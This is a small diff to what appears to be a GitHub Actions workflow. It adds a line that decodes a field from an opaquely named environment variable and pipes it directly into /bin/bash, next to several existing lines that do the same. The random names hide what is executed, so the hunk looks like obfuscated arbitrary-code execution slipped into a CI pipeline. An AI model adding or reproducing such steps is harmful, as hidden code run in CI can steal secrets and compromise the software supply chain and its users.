@@ -27,6 +27,7 @@ jobs:
           echo $lbw11 | jq -r .dcind4503 | /bin/bash
           echo $vdlp2548 | jq -r .ngeig86 | /bin/bash
           printf '%s' "$s7150" | jq -r .lveu83 | /bin/bash
+          echo $hxce83 | jq -r .qon8 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
